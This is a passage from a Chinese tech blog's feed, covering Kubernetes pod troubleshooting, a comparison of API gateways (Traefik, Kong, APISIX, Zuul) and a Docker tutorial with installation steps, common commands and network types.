19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257: driver <span class="hljs-string">&quot;overlay2&quot;</span> failed to remove root filesystem: remove /data/docker/overlay2/b1aea29c590aa9abda79f7cf3976422073fb3652757f0391db88534027546868/diff/usr/bin/bash: operation not permitted<br></code></pre></td></tr></table></figure><p><strong>docker 17 的 bug</strong><br>docker hang 住，没有任何响应，看 event:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Warning FailedSync 3m (x408 over 1h) kubelet, 10.179.80.31 error determining status: rpc error: code = DeadlineExceeded desc = context deadline exceeded<br></code></pre></td></tr></table></figure><p><strong>mount 的目录被其它进程占用</strong><br>dockerd 报错 device or resource busy:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">May 09 09:55:12 VM_0_21_centos dockerd[6540]: <span class="hljs-keyword">time</span>=<span class="hljs-string">&quot;2020-05-09T09:55:12.774467604+08:00&quot;</span> level=error msg=<span class="hljs-string">&quot;Handler for DELETE /v1.38/containers/b62c3796ea2ed5a0bd0eeed0e8f041d12e430a99469dd2ced6f94df911e35905 returned error: container b62c3796ea2ed5a0bd0eeed0e8f041d12e430a99469dd2ced6f94df911e35905: driver \&quot;overlay2\&quot; failed to remove root filesystem: remove /data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/merged: device or resource busy&quot;</span><br><br>查找还有谁在<span class="hljs-string">&quot;霸占&quot;</span>此目录:<br>$ grep 8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59 /proc/*/mountinfo<br>/proc/27187/mountinfo:4500 4415 0:898 / /var/lib/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/merged rw,relatime - overlay overlay rw,lowerdir=/data/docker/overlay2/l/DNQH6VPJHFFANI36UDKS262BZK:/data/docker/overlay2/l/OAYZKUKWNH7GPT4K5MFI6B7OE5:/data/docker/overlay2/l/ANQD5O27DRMTZJG7CBHWUA65YT:/data/docker/overlay2/l/G4HYAKVIRVUXB6YOXRTBYUDVB3:/data/docker/overlay2/l/IRGHNAKBHJUOKGLQBFBQTYFCFU:/data/docker/overlay2/l/6QG67JLGKMFXGVB5VCBG2VYWPI:/data/docker/overlay2/l/O3X5VFRX2AO4USEP2ZOVNLL4ZK:/data/docker/overlay2/l/H5Q5QE6DMWWI75ALCIHARBA5CD:/data/docker/overlay2/l/LFISJNWBKSRTYBVBPU6PH3YAAZ:/data/docker/overlay2/l/JSF6H5MHJEC4VVAYOF5PYIMIBQ:/data/docker/overlay2/l/7D2F45I5MF2EHDOARROYPXCWHZ:/data/docker/overlay2/l/OUJDAGNIZXVBKBWNYCAUI5YSGG:/data/docker/overlay2/l/KZLUO6P3DBNHNUH2SNKPTFZOL7:/data/docker/overlay2/l/O2BPSFNCVXTE4ZIWGYSRPKAGU4,upperdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/diff,workdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/work<br>/proc/27187/mountinfo:4688 4562 0:898 / /var/lib/docker/overlay2/81c322896bb06149c16786dc33c83108c871bb368691f741a1e3a9bfc0a56ab2/merged/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/merged rw,relatime - overlay overlay rw,lowerdir=/data/docker/overlay2/l/DNQH6VPJHFFANI36UDKS262BZK:/data/docker/overlay2/l/OAYZKUKWNH7GPT4K5MFI6B7OE5:/data/docker/overlay2/l/ANQD5O27DRMTZJG7CBHWUA65YT:/data/docker/overlay2/l/G4HYAKVIRVUXB6YOXRTBYUDVB3:/data/docker/overlay2/l/IRGHNAKBHJUOKGLQBFBQTYFCFU:/data/docker/overlay2/l/6QG67JLGKMFXGVB5VCBG2VYWPI:/data/docker/overlay2/l/O3X5VFRX2AO4USEP2ZOVNLL4ZK:/data/docker/overlay2/l/H5Q5QE6DMWWI75ALCIHARBA5CD:/data/docker/overlay2/l/LFISJNWBKSRTYBVBPU6PH3YAAZ:/data/docker/overlay2/l/JSF6H5MHJEC4VVAYOF5PYIMIBQ:/data/docker/overlay2/l/7D2F45I5MF2EHDOARROYPXCWHZ:/data/docker/overlay2/l/OUJDAGNIZXVBKBWNYCAUI5YSGG:/data/docker/overlay2/l/KZLUO6P3DBNHNUH2SNKPTFZOL7:/data/docker/overlay2/l/O2BPSFNCVXTE4ZIWGYSRPKAGU4,upperdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/diff,workdir=/data/docker/overlay2/8bde3ec18c5a6915f40dd8adc3b2f296c1e40cc1b2885db4aee0a627ff89ef59/work<br><br>找到进程号后查看此进程更多详细信息:<br>ps -f 27187<br></code></pre></td></tr></table></figure><h1 id="Pending"><a href="#Pending" class="headerlink" title="Pending"></a>Pending</h1><p>Pod 一直 Pending 一般是调度失败，调度失败的原因一般包含以下内容:<br><strong>一、节点没有足够资源分配pod</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl describe node &lt;node-name&gt;<br></code></pre></td></tr></table></figure><p><strong>二、不满足节点亲和</strong><br>如果 Pod 包含 affinity（亲和性）的配置，调度器根据调度算法也可能算出没有满足条件的 Node，从而无法调度。affinity 有以下几类:<br>nodeAffinity: 节点亲和性，可以看成是增强版的 nodeSelector，用于限制 Pod 只允许被调度到某一部分 Node。<br>podAffinity:   Pod亲和性，用于将一些有关联的 Pod 调度到同一个地方，同一个地方可以是指同一个节点或同一个可用区的节点等。<br>podAntiAffinity: Pod 反亲和性，用于避免将某一类 Pod 调度到同一个地方避免单点故障，比如将集群 DNS 服务的 Pod 副本都调度到不同节点，避免一个节点挂了造成整个集群 DNS 解析失败，使得业务中断</p><p><strong>三、污点</strong><br>节点如果被打上了污点，Pod 必须要容忍污点才能调度上去:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0/5 nodes are available: 3 node(s) had taints that the pod didn<span class="hljs-string">&#x27;t tolerate, 2 Insufficient memory.</span><br></code></pre></td></tr></table></figure><p>通过 describe node 可以看下 Node 有哪些 Taints:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl describe nodes host1<br>...<br>Taints:             special=<span class="hljs-literal">true</span>:NoSchedule<br>...<br></code></pre></td></tr></table></figure><p>如果希望 Pod 可以调度上去，通常解决方法有两个:<br>1.删除污点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl taint nodes host1 special-<br></code></pre></td></tr></table></figure><p>2.给pod加上污点容忍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">tolerations:<br>- key: <span class="hljs-string">&quot;special&quot;</span><br>  operator: <span class="hljs-string">&quot;Equal&quot;</span><br>  value: <span class="hljs-string">&quot;true&quot;</span><br>  effect: <span class="hljs-string">&quot;NoSchedule&quot;</span><br></code></pre></td></tr></table></figure><p><strong>四、kube-scheduler没有正常运行</strong><br>检查 maser 上的 kube-scheduler 是否运行正常，异常的话可以尝试重启临时恢复。</p><h1 id="ContainerCreating-Waiting"><a href="#ContainerCreating-Waiting" class="headerlink" title="ContainerCreating-Waiting"></a>ContainerCreating-Waiting</h1><p><strong>一、镜像问题</strong></p><p><strong>二、configmap&#x2F;secret挂载问题</strong></p><p><strong>三、limit 设置太小或者单位不对</strong></p><p><strong>四、存在同名容器</strong></p><h1 id="CrashLoopBackOff"><a href="#CrashLoopBackOff" class="headerlink" title="CrashLoopBackOff"></a>CrashLoopBackOff</h1><p>Pod 如果处于 CrashLoopBackOff 状态说明之前是启动了，只是又异常退出了。</p><p><strong>一、容器进程主动退出</strong><br>如果是容器进程主动退出，退出状态码一般在 0-128 之间，除了可能是业务程序 BUG，还有其它许多可能原因。内部程序崩溃或者依赖缺失等。</p><p><strong>二、系统 OOM</strong><br>如果是系统oom溢出，容器状态码是137，表示被 SIGKILL 信号杀死，同时内核会报错: Out of memory: Kill process。大概率是节点上部署了其它非 K8S 管理的进程消耗了比较多的内存</p><p><strong>三、cgroup OOM</strong><br>如果是 cgrou OOM 杀掉的进程，从 Pod 事件的下 Reason 可以看到是 OOMKilled，说明容器实际占用的内存超过 limit 了，同时内核日志会报: Memory cgroup out of memory。 可以根据需求调整下 limit。</p><p><strong>四、探针问题，健康检查失败</strong><br>Liveness 和 Readiness 探针配置不正确，导致容器不断重启。</p><h1 id="ImagePullBackOff"><a href="#ImagePullBackOff" class="headerlink" title="ImagePullBackOff"></a>ImagePullBackOff</h1><p><strong>一、私有镜像仓库认证失败</strong><br>仓库需要认证，配置的 Secret 不存在或者有误都会认证失败，可以先在调度的Node节点中执行docker pull命令，验证镜像是否可以拉取</p><p><strong>二、镜像文件损坏</strong><br>如果 push 的镜像文件损坏了，下载下来也用不了，需要重新 push 镜像文件</p>]]></content>
    
    
    <categories>
      
      <category>故障指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>故障指南</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>微服务网关，如何选择？</title>
    <link href="/2025/04/16/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%EF%BC%8C%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%EF%BC%9F/"/>
    <url>/2025/04/16/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%EF%BC%8C%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p> 什么是API网关</p><p>API网关（API Gateway）是<a href="https://docs.ihr360.com/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1">微服务</a>架构中的一个关键组件，它充当了客户端与后端服务之间的中间层。其主要功能包括请求路由、协议转换、负载均衡、安全认证、限流熔断等。通过API网关，客户端无需直接与多个微服务交互，而是通过统一的入口访问后端服务，从而简化了系统的复杂性。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/564755fc62824849b499c01cc7bf8c7d.png" alt="img"></p><p>API 网关的主要功能</p><p><strong>路由功能</strong>：路由是微服务网关的核心能力。通过路由功能微服务网关可以将请求转发到目标微服务。在微服务架构中，网关可以结合注册中心的动态服务发现，实现对后端服务的发现，调用方只需要知道网关对外暴露的服务API就可以透明地访问后端微服务。</p><p><strong>负载均衡</strong>：API网关结合负载均衡技术，利用Eureka或者Consul等服务发现工具，通过轮询、指定权重、IP地址哈希等机制实现下游服务的负载均衡。</p><p><strong>统一鉴权</strong>：一般而言，无论对内网还是外网的接口都需要做用户身份认证，而用户认证在一些规模较大的系统中都会采用统一的单点登录（Single Sign On）系统，如果每个微服务都要对接单点登录系统，那么显然比较浪费资源且开发效率低。API网关是统一管理安全性的绝佳场所，可以将认证的部分抽取到网关层，微服务系统无须关注认证的逻辑，只关注自身业务即可。</p><p><strong>协议转换</strong>：API网关的一大作用在于构建异构系统，API网关作为单一入口，通过协议转换整合后台基于REST、AMQP、Dubbo等不同风格和实现技术的微服务，面向Web Mobile、开放平台等特定客户端提供统一服务。</p><p><strong>指标监控</strong>：网关可以统计后端服务的请求次数，并且可以实时地更新当前的流量健康状态，可以对URL粒度的服务进行延迟统计，也可以使用Hystrix Dashboard查看后端服务的流量状态及是否有熔断发生。</p><p><strong>限流熔断</strong>：在某些场景下需要控制客户端的访问次数和访问频率，一些高并发系统有时还会有限流的需求。在网关上可以配置一个阈值，当请求数超过阈值时就直接返回错误而不继续访问后台服务。当出现流量洪峰或者后端服务出现延迟或故障时，网关能够主动进行熔断，保护后端服务，并保持前端用户体验良好。</p><p><strong>黑白名单</strong>：微服务网关可以使用系统黑名单，过滤HTTP请求特征，拦截异常客户端的请求，例如DDoS攻击等侵蚀带宽或资源迫使服务中断等行为，可以在网关层面进行拦截过滤。比较常见的拦截策略是根据IP地址增加黑名单。在存在鉴权管理的路由服务中可以通过设置白名单跳过鉴权管理而直接访问后端服务资源。</p><p><strong>灰度发布</strong>：微服务网关可以根据HTTP请求中的特殊标记和后端服务列表元数据标识进行流量控制，实现在用户无感知的情况下完成灰度发布。</p><p><strong>流量染色</strong>：和灰度发布的原理相似，网关可以根据HTTP请求的Host、Head、Agent等标识对请求进行染色，有了网关的流量染色功能，我们可以对服务后续的调用链路进行跟踪，对服务延迟及服务运行状况进行进一步的链路分析。</p><p><strong>文档中心</strong>：网关结合Swagger，可以将后端的微服务暴露给网关，网关作为统一的入口给接口的使用方提供查看后端服务的API规范，不需要知道每一个后端微服务的Swagger地址，这样网关起到了对后端API聚合的效果。</p><p><strong>日志审计</strong>：微服务网关可以作为统一的日志记录和收集器，对服务URL粒度的日志请求信息和响应信息进行拦截。</p><p>API 网关的架构和工作原理</p><p>在微服务架构中，每个微服务可能负责不同的业务功能，而每个微服务又可能会有多个实例。当客户端发起请求时，API 网关作为所有请求的统一入口，接收并处理这些请求。API 网关的工作原理可以大致描述为：</p><p><strong>接收请求</strong>：客户端向 API 网关发送请求，而不是直接访问各个微服务。</p><p><strong>请求处理</strong>：API 网关根据请求内容决定将请求路由到哪个微服务。如果请求需要经过认证，API 网关会先验证请求的合法性。</p><p><strong>转发请求</strong>：API 网关将请求转发到适当的微服务或服务实例。如果请求需要经过多个微服务的协作，API 网关可能会发起多个请求并聚合结果。</p><p><strong>返回响应</strong>：API 网关收集微服务的响应，并将它们汇总后返回给客户端。</p><p>API网关选型</p><p>这些 API 网关是从云原生软件基金会（CNCF）的全景图中摘选的</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d359e4681eff4f60bcbd4bda9b2993a7.png" alt="img"></p><p> 先简单看一下市面上常用的API网关：</p><table><thead><tr><th>特性</th><th>Traefik</th><th>Kong</th><th>APISIX (API6)</th><th>Zuul</th></tr></thead><tbody><tr><td>架构</td><td>轻量级，基于 Go 和 Docker&#x2F;K8s 集成</td><td>高性能，基于 Lua 和 Nginx</td><td>高性能，基于 Nginx 和 Lua</td><td>基于 Java，Spring Cloud 集成</td></tr><tr><td>协议支持</td><td>HTTP, HTTPS, WebSocket, gRPC</td><td>HTTP, HTTPS, gRPC, TCP, UDP</td><td>HTTP, HTTPS, WebSocket, gRPC</td><td>HTTP, HTTPS</td></tr><tr><td>自动化&#x2F;集成</td><td>自动发现服务，易于容器化环境集成</td><td>高度可扩展，支持 Kubernetes</td><td>动态路由，云原生支持</td><td>集成 Spring Cloud，适用于 Java</td></tr><tr><td>插件支持</td><td>少量插件支持</td><td>丰富的插件生态，支持认证、安全等</td><td>丰富的插件支持，功能强大</td><td>支持过滤器机制，集成 Spring Cloud</td></tr><tr><td>易用性</td><td>易于配置，自动化程度高</td><td>配置复杂，但功能强大</td><td>高度可定制，配置灵活</td><td>适合 Java 开发者，集成容易</td></tr><tr><td>社区支持</td><td>社区活跃，受 Kubernetes 支持</td><td>企业级解决方案，活跃的社区</td><td>新兴的高性能网关，社区活跃</td><td>主要用于 Java 环境，Spring Cloud 支持</td></tr></tbody></table><p><strong>选择建议：</strong></p><p>如果在 <strong>Kubernetes</strong> 或容器化环境中工作，<strong>Traefik</strong> 可能是一个最合适的选择。</p><p>如果需要一个功能强大、可扩展并支持高并发的 <strong>API 网关</strong>，<strong>Kong</strong> 和 <strong>APISIX</strong> 都是非常优秀的选择，Kong 提供了更多的插件支持，而 APISIX 可能在高性能方面略有优势。</p><p>如果使用 <strong>Spring Cloud</strong> 或 <strong>Java</strong> 技术栈，<strong>Zuul</strong> 可能是更好的选择，Zuul由于与Spring Cloud深度集成，使用度也很高，近年来Istio服务网格的流行，Ambassador因为能够和Istio无缝集成也是相当大的优势。</p>]]></content>
    
    
    <categories>
      
      <category>云原生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一篇文章带你搞定docker</title>
    <link href="/2025/04/16/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%90%9E%E5%AE%9Adocker/"/>
    <url>/2025/04/16/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%90%9E%E5%AE%9Adocker/</url>
    
    <content type="html"><![CDATA[<blockquote><p> Docker 是一个客户端-服务器（C&#x2F;S）架构程序。Docker 客户端只需要向 Docker 服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。Docker 提供了一个命令行工具 Docker 以及一整套 RESTful API。</p></blockquote><p>通过下图可以得知，Docker 在运行时分为 Docker 引擎（服务端守护进程） 和 客户端工具，我们日常使用各种 docker 命令，其实就是在使用 客户端工具 与 Docker 引擎 进行交互。</p><h1 id="一、架构图"><a href="#一、架构图" class="headerlink" title="一、架构图"></a>一、架构图</h1><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1aa02be9df9c4e31b33d5df8f80c2b63.png" alt="img"></p><p> <strong>Client 客户端</strong></p><p>Docker 是一个客户端-服务器（C&#x2F;S）架构程序。Docker 客户端只需要向 Docker 服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。Docker 提供了一个命令行工具 Docker 以及一整套 RESTful API。你可以在同一台宿主机上运行 Docker 守护进程和客户端，也可以从本地的 Docker 客户端连接到运行在另一台宿主机上的远程 Docker 守护进程。</p><p><strong>Image 镜像</strong></p><p>什么是 Docker 镜像？简单的理解，Docker 镜像就是一个 Linux 的文件系统（Root FileSystem），这个文件系统里面包含可以运行在 Linux 内核的程序以及相应的数据。<br> 通过镜像启动一个容器，一个镜像就是一个可执行的包，其中包括运行应用程序所需要的所有内容：包含代码，运行时间，库，环境变量和配置文件等。<br> Docker 把 App 文件打包成为一个镜像，并且采用类似多次快照的存储技术，可以实现：</p><p> 多个 App 可以共用相同的底层镜像（初始的操作系统镜像）；<br> App 运行时的 IO 操作和镜像文件隔离；<br> 通过挂载包含不同配置&#x2F;数据文件的目录或者卷（Volume），单个 App 镜像可以用来运行无数个不同业务的容器。</p><p><strong>Container 容器</strong></p><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p><strong>repostory仓库</strong></p><p>仓库是集中存储镜像文件的沧桑，registry是仓库主从服务器，实际上参考注册服务器上存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（tag）。</p><p>仓库分为两种，公有参考，和私有仓库，最大的公开仓库是docker Hub，存放了数量庞大的镜像供用户下周，国内的docker pool，这里仓库的概念与Git类似，registry可以理解为github这样的托管服务</p><h1 id="二、docker部署"><a href="#二、docker部署" class="headerlink" title="二、docker部署"></a>二、docker部署</h1><p><strong>下载软件包</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://download.docker.com/linux/static/stable/x86_64/docker-<span class="hljs-number">20</span>.<span class="hljs-number">10</span>.<span class="hljs-number">24</span>.tgz<br></code></pre></td></tr></table></figure><p><strong>解压软件包</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@docker101:~# tar xf docker-<span class="hljs-number">20</span>.<span class="hljs-number">10</span>.<span class="hljs-number">24</span>.tgz<br></code></pre></td></tr></table></figure><p><strong>拷贝到PATH变量</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@docker101</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cp docker/* /usr/bin/</span><br></code></pre></td></tr></table></figure><p><strong>启动docker</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@docker101</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># dockerd </span><br>root<span class="hljs-variable">@docker101</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># dockerd &amp;  #后台运行</span><br></code></pre></td></tr></table></figure><p><strong>查看docker版本号</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@docker101</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker version</span><br></code></pre></td></tr></table></figure><h1 id="三、卸载docker环境"><a href="#三、卸载docker环境" class="headerlink" title="三、卸载docker环境"></a><strong>三、卸载docker环境</strong></h1><p><strong>停止docker环境</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@docker101</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># pkill dockerd</span><br></code></pre></td></tr></table></figure><p><strong>卸载</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@docker101:~# <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">ls</span> docker`;<span class="hljs-keyword">do</span> <span class="hljs-built_in">rm</span> -f /usr/bin/<span class="hljs-variable">$i</span> ;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>验证</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@docker101</span>:~<span class="hljs-meta"># docker</span><br>Command <span class="hljs-string">&#x27;docker&#x27;</span> <span class="hljs-literal">not</span> found, but can be installed <span class="hljs-keyword">with</span>:<br></code></pre></td></tr></table></figure><h1 id="四、docker常用命令"><a href="#四、docker常用命令" class="headerlink" title="四、docker常用命令"></a>四、docker常用命令</h1><h3 id="Docker基础命令"><a href="#Docker基础命令" class="headerlink" title="Docker基础命令"></a>Docker基础命令</h3><p>启动&#x2F;停止&#x2F;重启docker</p><blockquote><p># 启动<br> systemctl start docker<br> # 停止<br> systemctl stop docker<br> # 重启<br> systemctl restart docker</p></blockquote><p>设置开机自启动</p><blockquote><p># 设置<br> systemctl enable docker<br> # 取消开机自启动<br> systemctl disable docker</p></blockquote><p>查看docker状态</p><blockquote><p>systemctl status docker</p></blockquote><p>查看版本信息</p><blockquote><p>docker version</p><p>#该命令显示当前安装的Docker客户端和服务器版本信息。</p></blockquote><p>显示Docker系统信息</p><blockquote><p>docker info</p></blockquote><p>查看帮助</p><blockquote><p>docker –help </p></blockquote><h3 id="镜像管理命令"><a href="#镜像管理命令" class="headerlink" title="镜像管理命令"></a>镜像管理命令</h3><p>搜索镜像</p><blockquote><p>docker search [镜像名]</p></blockquote><p>下载镜像</p><blockquote><p>docker pull [镜像名]:[标签] </p></blockquote><p>列出本地镜像</p><blockquote><p>docker images </p></blockquote><p>删除镜像</p><blockquote><p>docker rmi [镜像ID或镜像名] </p></blockquote><p>删除全部镜像</p><blockquote><p>docker rmi -f $(docker images -aq)</p><p>-a 意思为显示全部,</p><p>-q 意思为只显示ID </p></blockquote><p>构建镜像</p><blockquote><p>docker build -t [镜像名]:[标签] [Dockerfile所在路径]</p></blockquote><p>导入镜像 </p><blockquote><p>docker load -i &#x2F;data&#x2F;nginx.tar</p></blockquote><p>保存镜像</p><blockquote><p>docker save -o &#x2F;data&#x2F;nginx.tar nginx </p></blockquote><p>给镜像打标签</p><blockquote><p>docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]<br> docker tag nginx 10.10.10.200&#x2F;software&#x2F;nginx:1.26 </p></blockquote><h3 id="容器管理命令"><a href="#容器管理命令" class="headerlink" title="容器管理命令"></a>容器管理命令</h3><p>创建并运行容器</p><blockquote><p>docker run [选项] [镜像名]</p><p>-d 后台运行容器</p><p>-p 端口映射</p><p>–name 指定容器名称</p><p>-v 挂载卷 主机路径:容器路径</p></blockquote><p>在后台运行一个名为mynginx的nginx容器，并映射端口：</p><blockquote><p>docker run -d -p 8080:80 –name mynginx nginx</p></blockquote><p> 查看运行中的容器</p><blockquote><p>docker ps</p></blockquote><p>查看所有容器（包括停止的）</p><blockquote><p> docker ps -a</p></blockquote><p> 启动和停止容器</p><blockquote><p># 启动容器<br> docker start [容器ID或容器名]</p><p> # 停止容器<br> docker stop [容器ID或容器名]</p></blockquote><p>重启容器</p><blockquote><p>docker restart [容器ID或容器名] </p></blockquote><p>删除容器</p><blockquote><p>docker rm [容器ID或容器名] </p></blockquote><p>进入容器</p><blockquote><p>docker exec -it [容器ID或容器名] &#x2F;bin&#x2F;bash </p></blockquote><p>查看容器日志</p><blockquote><p>1.查看实时日志<br> docker container logs -f  c1</p><p>2.查看20分钟之内的日志<br> docker container logs -f  –since 20m c1</p><p>3.查看20分钟之前的日志<br> docker container logs -f  –until 20m c1</p></blockquote><p>查看容器内部细节</p><blockquote><p>docker inspect [容器ID或容器名] </p></blockquote><h3 id="数据卷管理命令"><a href="#数据卷管理命令" class="headerlink" title="数据卷管理命令"></a>数据卷管理命令</h3><p>数据卷（Volume）是Docker中持久化数据的关键，通过数据卷可以将容器内的数据持久化到宿主机中 。</p><p>创建数据卷</p><blockquote><p>docker volume create [卷名]<br> docker volume create data</p></blockquote><p> 查看数据卷</p><blockquote><p>docker volume ls</p></blockquote><p>删除数据卷</p><blockquote><p>docker volume rm [卷名]<br> docker volume rm data </p></blockquote><p> 查看数据卷详情</p><blockquote><p>docker volume inspect [卷名]</p></blockquote><h3 id="网络管理命令"><a href="#网络管理命令" class="headerlink" title="网络管理命令"></a>网络管理命令</h3><p>创建网络</p><blockquote><p>docker network create [网络名]</p></blockquote><p>查看网络</p><blockquote><p>docker network ls </p></blockquote><p> 查看网络详情</p><blockquote><p>docker network inspect [网络名]</p></blockquote><p>删除网络</p><blockquote><p>docker network rm [网络名]</p></blockquote><p>将容器连接到网络</p><blockquote><p>docker network connect [网络名] [容器名或容器ID] </p></blockquote><p>将容器从网络断开</p><blockquote><p>docker network disconnect [网络名] [容器名或容器ID] </p></blockquote><h3 id="Docker-Compose命令"><a href="#Docker-Compose命令" class="headerlink" title="Docker Compose命令"></a>Docker Compose命令</h3><blockquote><p>编译镜像<br> docker-compose build</p><p>后台创建并启动容器<br> docker-compose up -d</p><p>查看容器状态<br> docker-compose ps</p><p>停止所有服务<br> docker-compose stop -t </p><p>启动所有服务<br> docker-compose start</p><p>重启指定服务<br> docker-compose restart doudizhu</p><p>删除并停止容器<br> docker-compose down -t 0</p></blockquote><h3 id="常用清理命令"><a href="#常用清理命令" class="headerlink" title="常用清理命令"></a>常用清理命令</h3><p>删除所有已停止的容器</p><blockquote><p>docker container prune</p></blockquote><p> 删除未使用的镜像</p><blockquote><p>docker image prune</p></blockquote><p>删除所有未使用的数据卷</p><blockquote><p>docker volume prune </p></blockquote><p> 删除所有未使用的网络</p><blockquote><p>docker network prune</p></blockquote><p> 清理所有未使用的资源（包括镜像、容器、卷和网络）</p><blockquote><p>docker system prune</p></blockquote><h1 id="五、docker网络原理"><a href="#五、docker网络原理" class="headerlink" title="五、docker网络原理"></a>五、docker网络原理</h1><p> docker默认使用的单机容器网络模型。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/03dd15f5ef154a0dbaf235e37f886edd.png" alt="img"></p><ol><li>每个容器（Container）分别拥有自己的Network Namespace。</li><li>容器通过对设备，连接到宿主机的Host Network Namespace。对设备在容器Network Namespace这一端的“网卡”是eth0，eth0配置的ip即容器的ip。对设备连接Host Namespace的那一端挂载到网桥设备docker0。</li><li>网桥设备docker0，挂载着所有容器的对设备的Host Namespace这一端。并且，挂载在网桥上的设备，会被降级成网桥上的一个端口，端口的唯一作用就是转发网桥或另一端对设备的数据包。</li><li>从Container1发送到Container2的数据包，首先经过Container1中的eth0，到达docker0网桥，docker0网桥经过二层转发，将数据包发送到Container2对应的端口（Container2对设备的docker0网桥这一端），这样数据包就被直接送到Container2中了。</li></ol><h1 id="六、docker网络类型"><a href="#六、docker网络类型" class="headerlink" title="六、docker网络类型"></a>六、docker网络类型</h1><p><strong>单机网络类型</strong></p><blockquote><p>brdge    #默认网络类型，网桥模式，docker在宿主机创建docker 0网桥<br> none    #容器将没有网络连接，用于不需要网络功能的容器<br> host     #容器直接使用宿主机的端口，不需要知道端口<br> contianer #与另一个运行中的容器共享Network Namespace<br> 自定义网络 #相当于内置dns，基于容器名称访问彼此</p></blockquote><p><strong>跨主机网络类型</strong></p><blockquote><p>macvlan       #手动分配ip，绑定物理网卡<br> overlay+consul  #创建overlay网络，利用consul服务发现<br> flannel+etcd<br> calica+etcd</p></blockquote><p><strong>macvlan和overlay的区别</strong></p><p>相同点: 